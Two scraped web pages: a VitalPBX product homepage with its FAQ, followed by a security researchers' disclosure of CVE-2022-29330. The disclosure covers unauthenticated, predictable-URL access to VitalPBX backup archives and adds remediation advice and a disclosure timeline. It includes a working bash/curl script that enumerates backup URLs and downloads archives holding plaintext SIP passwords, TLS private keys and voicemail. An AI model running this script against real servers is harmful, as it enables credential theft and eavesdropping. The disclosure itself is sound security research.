=== Content from vitalpbx.com_80c6358c_20250108_144134.html ===
                [Facebook](https://www.facebook.com/vitalpbx/)     [X-twitter](https://twitter.com/vitalpbx)     [Linkedin](https://www.linkedin.com/company/vitalpbx/)     [Youtube](https://www.youtube.com/vitalpbx)     [Telegram](https://t.me/vitalpbx)     Envelope              [Course](https://www.udemy.com/course/vitalpbx-complete-training-course-asterisk-pbx-solution/)         [Wiki](https://wiki.vitalpbx.com/)         [Blog](https://vitalpbx.com/blog/)         [Partner](https://partners.vitalpbx.com/)         [My account](https://vitalpbx.com/my-account/)                  $0.00  0  Cart                 [![vitalpbx - best multi tenant pbx system based on asterisk](data:image/svg+xml;nitro-empty-id=MzQ3OjQ2NQ==-1;base64...)](https://vitalpbx.com)

* [Home](https://vitalpbx.com/ "VitalPBX – Fastest growing PBX System based on asterisk")
  + [Features](https://vitalpbx.com/pbx-features/)
  + [Effective Compatibility and Strategic Partners](https://vitalpbx.com/pbx-compatibility-strategic-partners/)
  + [Phone Compatibility](https://vitalpbx.com/vitalpbx-phone-compatibility/)
* [Plans](https://vitalpbx.com/pbx-plans-and-pricing-vitalpbx-system/ "Plans and Pricing")
  ## VitalPBX One Plan

  VitalPBX One is the all-in-one solution designed to improve your business's collaboration and communication to new levels

  + Multi-Tenant
  + Whatsapp and SMS integration
  + No limits concurrent call plan
  + All VitalPBX Modules
  + And More      [Learn More](https://vitalpbx.com/vitalpbx-one-pbx-plan/)
  ## VitalPBX Plans

  ##### Enterprise

  Ideal for any size and type of business.

          [Learn more](https://vitalpbx.com/pbx-plans-and-pricing-vitalpbx-system/)
  ##### Call Center

  Get features that cover all your call center needs

          [Learn more](https://vitalpbx.com/pbx-plans-and-pricing-vitalpbx-system/)
  ##### Carrier Plus

  Manage multiple PBX's on the same server

          [Learn more](https://vitalpbx.com/pbx-plans-and-pricing-vitalpbx-system/)
* [Download](https://vitalpbx.com/pbx-system-download/)
* [Store](https://vitalpbx.com/vitalpbx-store/ "VitalPBX Add-Ons Modules")
* Products
  ##### Sonata Suite

  Experience a fully featured Switchboard, Recording Manager, Call Center Statistics, Call Account, and Call Center Dialer, system,

            [Sonata Switchboard](https://vitalpbx.com/sonata-switchboard/)     [Sonata Recordings](https://vitalpbx.com/sonata-recordings/)     [Sonata Stats](https://vitalpbx.com/sonata-stats/)     [Sonata Billing](https://vitalpbx.com/sonata-suite-billing-system/)     [Sonata Dialer](https://vitalpbx.com/sonata-dialer-call-center-software/)
  ##### Add-ons

  The add-ons module allows you to install new modules in order to expand the PBX capabilities and add new features.

            [Starter License](https://vitalpbx.com/starter-license/)     [Multi Tenant PBX Solution](https://vitalpbx.com/multi-tenant-pbx/)     [Queues CallBack](https://vitalpbx.com/queues-callback/)           [View All](https://vitalpbx.com/add-ons-modules/)         [Go to store](https://vitalpbx.com/vitalpbx-store/)
  ##### VitXi WebRTC Softphone

  Communicate anywhere with VitXi, our full WebRTC client exclusively for your VitalPBX installation.

          [Learn more](https://www.vitalpbx.com/vitxi-webrtc-softphone-client-for-vitalpbx/)
  ##### VitalPBX Connect App

  With VitalPBX Connect, you can make and receive business calls on your smartphone.

          [Learn more](https://vitalpbx.com/vitalpbx-connect-pbx-app-ios-android/)
  ##### VitalPBX Communicator

  An advanced windows softphone for call center which integrates presence, chat, video call, BLF, and much more.

          [Learn more](https://vitalpbx.com/vitalpbx-communicator/)
  ##### Professional Support Packages

  We can help with everything from implementation assistance to upgrades and production down emergencies.

          [Get it](https://vitalpbx.com/product/professional-support-packages/)
* Support
  + [Support Information](https://vitalpbx.com/support-information/)
  + [Forum](https://forums.vitalpbx.org/)
  + [Frequent Questions & Answer](https://forums.vitalpbx.org/c/faq/14)
  + [Manuals](https://wiki.vitalpbx.com/)
  + Changes Log
    - [VitalPBX](https://vitalpbx.com/vitalpbx-phone-system-change-log/)
    - [VitXi](https://vitalpbx.com/vitxi-webrtc-phone-changes-log/)
    - [Sonata Dialer](https://vitalpbx.com/sonata-dialer-changes-log/ "Sonata Dialer")
    - [Sonata Stats](https://vitalpbx.com/sonata-stats-phone-changes-log/)
* Partners
  + [Partners Login](https://partners.vitalpbx.com/)
  + [Partners Program](https://vitalpbx.com/partners-program/)
  + [Find a VitalPBX Partner](https://vitalpbx.com/partners-vitalpbx/)
  + [Become a VitalPBX Partner](https://vitalpbx.com/apply-to-become-a-vitalpbx-partner/)
* [About Us](https://vitalpbx.com/free-pbx-system-based-on-asterisk-about-us/)
  + [Our Company](https://vitalpbx.com/free-pbx-system-based-on-asterisk-about-us/)
  + [Contact Us](https://vitalpbx.com/unified-communications-system-contact-us/)

[![]()](https://vitalpbx.com)X                                   Explore Our AI PBX Solutions At IT EXPO 2025Join us at Booth #2149, February 11–13, to see how AI enhances communication systems for businesses like yours.[Get A Free Pass](https://www.tmcnet.com/scripts/events/registration.aspx?theplan=IT0225-D&sc=VitalPBX)VitalPBX One: Greater Business with The Ultimate PBX PlanImprove your business communication with our new VitalPBX One Plan, the ultimate all-in-one PBX system tailored for businesses aiming for excellence. [Try It Today](https://vitalpbx.com/vitalpbx-one-pbx-plan/)Communication is Vital for your businessVitalPBX provides a feature-rich platform to help streamline your PBX management process. Get ready for an easy and efficient way to manage your PBX.[Download It Today](https://vitalpbx.com/pbx-system-download/)We make Companies communicate easilyVitalPBX has the set of tools to allow you to communicate no matter where you are located. Take advantage of these functionality to make your business safe and connected.[Download It Today](https://vitalpbx.com/pbx-system-download/)
## We make Companies communicate easily

VitalPBX has the set of tools to allow you to communicate no matter where you are located. Take advantage of these functionality to make your business safe and connected.

### Multi Tenant PBX

You can install VitalPBX in just one server and manage multiple PBXs with the same numbering plan but separated at an administrative level.

### No Per Extension Fees

With VitalPBX you can enjoy a variety of features without extension fees to increase your business productivity.

### Enhanced Call Center

Take your Call Center to the next level with powerful PBX Software. With VitalPBX you can easily have all your Call Center needs fulfilled.

## Need more sales information?

Our team is ready to assist you with any inquiries you may have. By reaching out to us via email, we can provide you with comprehensive information tailored to your specific needs. Get in touch today and discover the possibilities that await with VitalPBX for your business!

      Send Us An Email
## High-performance PBX software with a full set of essential features

VitalPBX is the graphic user interface between you and the complex world of modern communications

* Unified Communications
* Call Center Features
* High Quality Voice Calls
      [View all features](https://vitalpbx.com/pbx-features/)            [![pbx features](data:image/svg+xml;nitro-empty-id=OTc5Ojg1MA==-1;base64...)](https://vitalpbx.com/wp-content/uploads/2023/03/vitalpbx-4-desktop-gui-final.png)
## Advanced PBX system based on Asterisk

VitalPBX is a unified communications PBX system based on Asterisk and Linux (Debian 11). VitalPBX provides a robust and scalable platform, which will allow you to manage your PBX in an easy and intuitive way.

      [Download](https://vitalpbx.com/pbx-system-download/)
## Fastest growing **PBX system**

### 50,000 +

Installation Worldwide

### 175 +

Countries

### 25 +

Modules

### 2,000 +

Community Members

## Why **VitalPBX?**

         ### Unified Communications

 VitalPBX provides a robust and scalable platform, which will allow you to manage your PBX in an intuitive way.       ### Cloud-based PBX solution

 VitalPBX service provides telephony capabilities with clear HD voice technology.           ### Efficient

 High performance and scalable pbx system ideal for different types of businesses.       ### Cost Savings

 Our plans break the market patterns offering different facilities and benefits.
## Recent Blog Posts

           [![](data:image/svg+xml;nitro-empty-id=MTMxMTo3MzQ=-1;base64...)](https://vitalpbx.com/blog/vitalpbx-enhanced-api-security-and-system/)
### [VitalPBX 4.2.0 R2: Enhanced API Security and System Optimization](https://vitalpbx.com/blog/vitalpbx-enhanced-api-security-and-system/)

  December 12, 2024

We are pleased to announce the release of VitalPBX 4.2.0

  [Read More »](https://vitalpbx.com/blog/vitalpbx-enhanced-api-security-and-system/)      [![](data:image/svg+xml;nitro-empty-id=MTMzMzo3NDk=-1;base64...)](https://vitalpbx.com/blog/expanding-api-capabilities-and-enhancing-security/)
### [VitalPBX 4.5.0 R3: Expanding API Capabilities and Enhancing System Security](https://vitalpbx.com/blog/expanding-api-capabilities-and-enhancing-security/)

  December 12, 2024

VitalPBX 4.5.0 R3 enhances API capabilities with new endpoints, improves system security, and fixes critical issues including tenant isolation and Let’s Encrypt integration.

  [Read More »](https://vitalpbx.com/blog/expanding-api-capabilities-and-enhancing-security/)      [![](data:image/svg+xml;nitro-empty-id=MTM1NTo3MzE=-1;base64...)](https://vitalpbx.com/blog/using-sngrep-to-trace-calls-in-vitalpbx/)
### [Complete Guide: Using Sngrep to Trace Calls in VitalPBX (Asterisk)](https://vitalpbx.com/blog/using-sngrep-to-trace-calls-in-vitalpbx/)

  December 11, 2024

Introduction SNGREP is a powerful tool for real-time monitoring and

  [Read More »](https://vitalpbx.com/blog/using-sngrep-to-trace-calls-in-vitalpbx/)
### Advanced PBX System

## Frequently Asked Questions

                Where can I get a trial version of any of the plans?

To obtain a 15-day trial of any of our plans, send us an email to sales@vitalpbx.com.

         If I subscribe to a plan can I later migrate to another?

Yes, it is possible to migrate between plans, either from a monthly to yearly installment, or between whole plans.

         Can I have a demo so I can try VitalPBX?

You can download VitalPBX from the download section on our website, and install on any Virtual Machine, Dedicate Hardware, or VPS Service Provider like Amazon AWS, Google Cloud, Digital Ocean, among others. <https://vitalpbx.com/pbx-system-download/>.

Additionally, every add-on on VitalPBX, including the commercial add-ons, can be installed even without a license. This will allow to test and use the modules with all of their features for an unlimited amount of time. Learn more about our add-ons, [https://community.vitalpbx.org/installing-vitalpbx-add-ons/](https://vitalpbx.com/blog/installing-vitalpbx-add-ons/).

        Is VitalPBX Multi-Tenant capable?

Yes. VitalPBX is a complete Multi-Tenant solution. This means that you can install VitalPBX in just one server and manage multiple PBXs with the same numbering plan but separated at an administrative level. This saves you money on servers and makes it easier for you to manage your clients.

If you want more information go to [VitalPBX Multi-Tenant PBX.](https://vitalpbx.com/multi-tenant-pbx/)

         Does VitalPBX have mobility features for Remote Workers?

Yes. We have several solutions.

Our soft phone, [VitalPBX Connect](https://vitalpbx.com/vitalpbx-connect-pbx-app-ios-android/), you can install on Android or iOS.

[VitXi WebRTC](https://vitalpbx.com/vitxi-webrtc-softphone-client-for-vitalpbx/), that you can access from any browser, whether you are accessing from Windows, Mac, Linux, Chromebook, or even from your mobile device.

We also have [VitalPBX Communicator](https://vitalpbx.com/vitalpbx-communicator/) which is a Call Center Oriented Soft phone for Windows.

You can see more information in the products section of our website.

        How many Tenants can I have on a single server?

This depends on the number of extensions that each Tenant has as well as the concurrent calls and if any Tenant is going to have a Call Center and call recordings.

Although we have some customers that have more than 100 Tenant per server, we recommend not having more than 100 per Server.

We cannot offer support to clients with more than 100 Tenans per server.

        Can different Tenants have the same exts? like Tenant A 101 and Tenant B 101?

Yes, what changed is the name of the device in each Tenant, for example the extension 101 in Tenant A would have the device name (user) TA\_101 and in Tennat B it would have TB\_101 and so on.

                                                ![vitalpbx - best multi tenant pbx system based on asterisk](data:image/svg+xml;nitro-empty-id=MTUzMTo0NzM=-1;base64...)

VitalPBX provides a robust and scalable platform, which will allow you to manage your PBX in an easy and intuitive way.

#### Contact Info

2292 NW 82nd Ave HB 002998 Miami, Florida 33198.

**Email:** sales@vitalpbx.com

#### Support

* [Professional Support Packages](https://vitalpbx.com/product/professional-support-packages/)
* [Forum](https://forums.vitalpbx.org/)
* [F.A.Q's](https://forums.vitalpbx.org/c/faq/14)
* [Manuals](https://wiki.vitalpbx.com/)
* [VitalPBX Changes Log](https://vitalpbx.com/vitalpbx-phone-system-change-log/)
* [Contact Us](https://vitalpbx.com/unified-communications-system-contact-us/)

#### Give Us Your Rate

At VitalPBX, your feedback is crucial. If our system has benefited your business, please leave us a review on Trustpilot. Thank you!

     [Trustpilot](https://www.trustpilot.com/review/vitalpbx.org)

Copyright @ 2025 VitalPBX,  All rights reserved.

           [Facebook](https://www.facebook.com/vitalpbx/)     [X-twitter](https://twitter.com/vitalpbx)     [Linkedin](https://www.linkedin.com/company/vitalpbx/)     [Youtube](https://www.youtube.com/vitalpbx)     [Telegram](https://t.me/vitalpbx)     Envelope     [Instagram](https://www.instagram.com/vitalpbx/)                ![](https://px.ads.linkedin.com/collect/?pid=3436540&fmt=gif)   ![](https://www.facebook.com/tr?id=378198972881596&ev=PageView&noscript=1)

=== Content from www.arsouyes.org_122c28c5_20250108_144134.html ===

# [log Arsouyes.org](/)

* [News](/news/)
* [Articles](/articles/)
* [Projects](/products/)
* [Shop](https://shop.arsouyes.org)

# CVE-2022-29330 - vulnerability in VitalPBX < 3.2.1

* aryliin & tbowan
* ([en français](index.fr.html))
* June 23rd 2022

**Spoiler:** *We found that the VitalPBX’s backup
system was not secured enough; the files were readable without
restriction and gave access, in clear text, to passwords, cryptographic
keys and voicemails (amongst other). Hopefully, soon after our
annoucement, the vulnerability was fixed on may 4th (version
3.2.1).*

[![](/images/banners/default-en.png)](https://shop.arsouyes.org)

As we were ~~playing around~~ quietly configuring our VitalPBX
server, we discovered a vulnerability that was relatively easy to
implement and gave us access to data we should not be able to read
freely (*i.e.* passwords extensions, but not only). Here’s how it
works… and why you should update your version.

Useless for a family, therefore essential for a geek family, we have
an IPBX at home. Among the many software on the market, we have [installed a VitalPBX](/articles/2020/34_Installation_VitalPBX/)
in a virtual machine connected to the rest of our network and
responsible to connect our IP phones ([IP-8815](/articles/2019/11_Configuration_SIP_IP8815/)) and our
analog external lines (via [an HX4G
gateway](/articles/2019/08_Passerelle_telephonique_analogique/) connected to ISP boxes).

Throughout our adventures in this wonderful world of VoIP, we have
experimented lots of tricks that allow us to have, @home, all the features
expected from a business (or hotel) phone system: [ring group](/articles/2019/14_Configurer_groupes_sonnerie/), [voicemail](/articles/2019/13_Configurer_messagerie/) and [turing turing](/articles/2019/37_configurer_IPBX/) (to avoid
robot calls)…

![© Rodrigo SalomonHC @ pixabay](receptionnistes_Rodrigo_SalomonHC_pixabay.jpg)

© Rodrigo SalomonHC @
pixabay

Latest: backup (because [backups matters](/articles/2021/2021-08-16_Exercices/)). It is
true that given our infrastructure, this server is quick to install and
the rare data it contains can be lost, so we could have skipped it. The
thing is that as legal experts, we do not see ourselves working for
judges and companies without knowing what we are talking about (and also
because we like setup computers) .

And it was precisely while trying to setup the backup system, or
rather trying to automate it, that we discovered this vulnerability…

# VitalPBX’s Backup System

The setup of VitalPBX backups is done via the web administration
interface. Once logged in, you need to go to “admin / Tools / Backup
& Restore”. The html form presented by default allows you to create
a new backup profile, with at least a name.

![Create backup profile](image-20220417103139894.png)

Create backup profile

Once your backup profiles have been created, you can list them via
the menu icon (![bullet list icon](image-20220417102417456.png)) and then access them by clicking on their
name. The new screen display the configuration form and adds the list of
backups already made (within the limit configured above), and allows you
to restore one (button ![restore icon](image-20220417102907308.png)} on the right in the corresponding
line) and to create new savepoints (button ![new backup icon](image-20220418110617031.png)
at the bottom left of the screen).

![Detail of a backup profile](image-20220417102756629.png)

Detail of a backup profile

If you want to make backups automatically, you must first add an
automatic task profile (via the “PBX / Tools / cron profiles” menu)
because as long as there is none, the *Run automatically* field
only contains the `disabled` value).

# Backup Vulnerability

As you may have seen, the web interface also offers a button ![download icon](image-20220417103632334.png) to
download a savepoint. By clicking on it, you will then obtain an archive
in `tar` format which you could save on your side. It’s not
obvious because it hides the details from us ([it’s opaque](/articles/2020/43_Transparent_Opaque_Invisible/))
but this button just redirects your browser to the file address which
might look like as follows:

```
https://monipbx.monreseau.lan/static/backup/c4ca4238a0b923820dcc509a6f75849b/vitalpbx-1650260415.tar
```

It doesn’t look like much seen like that but by checking the details,
you’ll see that it’s going to be a problem.

## No access control

The configuration file of the web server is, as always on *Red
Hat*, in `/etc/httpd/conf.d/` and more particularly, the
file `vitalpbx.conf`. There is the configuration of the
vhosts (virtual web servers) used by vitalpbx, including that of the web
administration interface that interests us and of which here is an
extract:

```
<VirtualHost *:443>
        ...
        <Directory "/var/lib/vitalpbx/static">
                Require all granted
        </Directory>
        Alias /static "/var/lib/vitalpbx/static"
        ...
</VirtualHost>
```

If we read it from bottom to top, we learn that the
`/static` prefix in the address is in fact an alias which
corresponds to the `/var/lib/vitalpbx/static` directory. Then
(or rather *before*) that this directory is in free access
(`Require all granted`). No PHP code, no configuration line
or `.htaccess` file will temper this lack of access
control.

> If we know the address of a file, we can access it without
> constraint.

The only consolation is that the server does not allow directory
listing; if you access
`https://monipbx.mynetwork.lan/static/backup/`, the system
will return a *403 - Forbidden* error (you do not have the right
to see the contents of the directory).

## Deterministic address

We must therefore guess the rest of the address of the backup
files…

```
c4ca4238a0b923820dcc509a6f75849b/vitalpbx-1650260415.tar
```

* **`c4ca4238a0b923820dcc509a6f75849b`**,
  is easy to find, just paste it into any search engine to find out that
  it is the MD5 sum of the string “1” (the profile ID of the backup). By
  doing the test with new profiles we obtain, each time, the MD5 of their
  identifier, `c81e728d9d4c2f636f067f89cc14862c` for 2, then
  `eccbc87e4b5ce2fe28308fd9f2a7baf3` for 3, and so on.
* **`1650260415`** is more subtle (search
  engines won’t help you) but it’s just the timestamp of the file; be the
  number of seconds elapsed since January 1st, 1970 when the
  file was written to disk…

All you need is to find a profile identifier and a valid timestamp,
two pieces of information whose values follow very simple sequences.

> One can enumerate profiles (consecutive integers) and timestamps
> (countdown from *now*) until a backup file is found.

## Exploitation

Rather than testing these combinations by hand, we can automate all
of this. Here is a solution in bash 😉. In short, we test all timestamps
over the last 24 hours, for the first 10 profiles. And we quit the
script as soon as `curl` has found something.

```
#!/bin/bash

now=$(date +%s)
past=$(date -d "1 day ago" +%s)

for profile in $(seq 1 10) ; do
    md5=$(echo -n $profile | md5sum | sed -e "s/ .*//")

    curl -sk "https://localhost/static/backup/$md5/" \
        -o /dev/null -w "%{http_code}" \
        | grep -q "404" && continue

    for timestamp in $(seq $now -1 $past) ; do
        curl -fJOsk "https://monipbx.monreseau.lan/static/backup/$md5/vitalpbx-$timestamp.tar" && exit 1
    done
done
```

If you’re in a hurry, we can speed things up with a bit of
parallelism on the `curl` calls. For that, we will modify the
inner loop and directly pass the result of `seq` to
`xargs`.

```
    export md5=$(echo -n $profile | md5sum | sed -e "s/ .*//")
    ...
    seq $now -1 $past | xargs -P 10 -I % bash -c \
        'curl -fJOsk "https://localhost/static/backup/$md5/vitalpbx-%.tar" && exit 255' \
        || exit 1
```
## Impact

The backup file is a `tar` archive containing other
archives (`gz` and `tar.gz`). And among all that
is saved, some elements are particularly interesting…

* **`asterisk.sql.gz`** contains, among other
  things, the configuration of some PJSIP extensions and their identifiers
  (logins and passwords in plain text),
* **`dialplan.tar.gz`** contains, among other
  things, the configuration of the SIP extensions (in
  `sip__50-1-extensions.conf`) and PJSIP (in
  `pjsip__50-1-extensions.conf`), including identifiers (logins
  and passwords in plain text),
* **`certificates.tar.gz`** contains the [TLS certificates](/articles/2019/36_PKI/) and their
  corresponding private key,
* **`voicemail.tar.gz`**, as its name
  suggests, contains voicemail, i.e. the audio messages that callers have
  left.

So if someone gets their hands on your backup file, they can:

* **Spoof extensions** from the VoIP server, and read
  voice messages left by correspondents,
* **Spoof the server** (*e.g.* with an HTTPS
  proxy) and then recover administrator passwords.

And once he has the admin passwords, he can do anything.

# Fix

*Telesoft S.A* fixed this vulnerability in version 3.2.1, once
updated, your server is no longer vulnerable to this attack 🎉.

> In detail, the backup files are no longer directly accessible (they
> have been moved to `/var/lib/vitalpbx/backup`, outside the
> directories accessible by apache) and therefore require going through
> the user interface in PHP which does authentication checks.

To find out if your server has been attacked, you can look at the web
server logs. They are in `/var/log/httpd`, a search on
`/static/backup` will tell you if any accesses have taken
place. If you see access, and if you want to be careful, change your TLS
keys and passwords (extensions and to be careful, users).

# Disclosure log

* **Discovery:** April 1st, 2022
* **Communication to editor:** April 1st,
  2022
* **Fix:** Mai 4th ([version
  3.2.1 R1](https://vitalpbx.com/vitalpbx-phone-system-change-log/)).

# Do you like our articles ?

Then visit our [shop](https://shop.arsouyes.org).
# Stay informed

Our [news](/news/) are available on our [RSS feed](/rss.en.xml) or our mailing list.

# Fast navigation

* [News](/news/)
* [Articles](/articles/)
* [Projects](/products/)
* [shop](https://shop.arsouyes.org)
* [About](/about/)


